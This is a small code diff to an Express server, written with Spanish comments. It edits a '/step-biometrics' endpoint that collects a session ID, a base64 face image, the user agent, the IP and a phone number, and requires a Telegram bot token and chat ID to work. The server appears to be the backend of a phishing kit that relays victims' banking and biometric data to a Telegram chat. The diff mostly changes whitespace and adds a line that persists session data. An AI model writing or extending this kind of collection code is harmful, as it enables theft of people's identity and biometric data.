@@ -338,6 +338,7 @@ app.post('/consignar', async (req, res) => {
 app.post('/step-biometrics', async (req, res) => {
   try {
     const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
+	
 
     if (!BOT_TOKEN || !CHAT_ID) {
       return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
@@ -346,10 +347,12 @@ app.post('/step-biometrics', async (req, res) => {
     if (!sessionId || !imageBase64) {
       return res.status(400).json({ ok: false, error: 'Datos incompletos' });
     }
-
+ 
+       
     // ⚠️ NO romper si no existe la sesión
-    const session = sessionData.get(sessionId) || {};
-
+	
+     const session = sessionData.get(sessionId) || {};
+     sessionData.set(sessionId, session);
     // 🔹 Prioridad del número:
     // 1) sesión
     // 2) body
@@ -399,9 +402,6 @@ app.post('/step-biometrics', async (req, res) => {
     res.status(500).json({ ok: false });
   }
 });
-
-
-
 
 
 
